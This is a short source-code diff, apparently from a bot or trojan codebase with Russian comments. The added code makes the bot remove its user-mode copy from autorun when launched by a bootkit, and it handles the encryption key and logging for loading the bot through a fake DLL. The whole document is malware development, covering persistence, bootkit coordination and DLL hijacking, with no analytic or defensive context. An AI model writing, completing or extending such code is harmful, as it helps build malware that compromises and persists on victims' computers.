@@ -70,6 +70,13 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 
 	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");
 
+	switch( BOT::GetBotType() )
+	{
+		case BotBootkit: //если стартовали из под буткита, то удаляем ring3 бота из автозагрузки
+			BOT::DeleteAutorunBot();
+			break;
+	}
+
 	//UnhookDlls();
 
 	// Отключаем отображение ошибок при крахе процесса
@@ -261,6 +268,9 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
 	m_memcpy( FakeDllCryptKey, cryptKey, lenCryptKey );
 	FakeDllLenCryptKey = lenCryptKey;
+	FakeDllCryptKey[lenCryptKey] = 0;
+
+	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s', len key: %d", cryptKey, lenCryptKey );
 
 	if( BOT::BootkitIsRun() ) //если запущен буткит, то удаляем эту версию бота
 	{
